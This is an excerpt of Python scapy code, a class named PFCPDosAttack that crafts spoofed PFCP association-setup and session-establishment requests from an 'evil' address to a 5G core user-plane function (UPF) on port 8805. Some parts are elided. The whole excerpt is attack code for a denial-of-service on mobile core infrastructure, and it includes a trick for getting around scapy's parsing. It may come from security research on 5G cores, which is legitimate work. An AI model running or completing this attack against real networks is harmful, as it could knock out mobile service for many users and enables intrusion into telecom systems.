...
class PFCPDosAttack:
    def __init__(self, evil_addr, upf_addr, src_port, dest_port):
    ...
    def send_pfcp_association_setup_req(self):
        
        seq = self.new_seq()
        
        # Trick to bypass scapy's bad parsing
        node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=self.evil_addr)))
        recovery_timestamp = Raw(bytes(IE_RecoveryTimeStamp(
            timestamp=int(time.time())
        )))
        pfcp_msg = PFCP(
        ...
        packet = IP(src=self.evil_addr, dst=self.upf_addr)/UDP(sport=8805, dport=8805)/pfcp_msg
        packet = packet.__class__(bytes(packet))
    ...
    def send_pfcp_session_establishment_req(self):
        seq = self.new_seq()
        seid = self.new_seid()
        ...
        ie_nodeid = Raw(bytes(IE_NodeId(id_type=0, ipv4=self.evil_addr)))
        ie_fseid = Raw(bytes(IE_FSEID(seid=seid, v4=1, ipv4=self.evil_addr)))
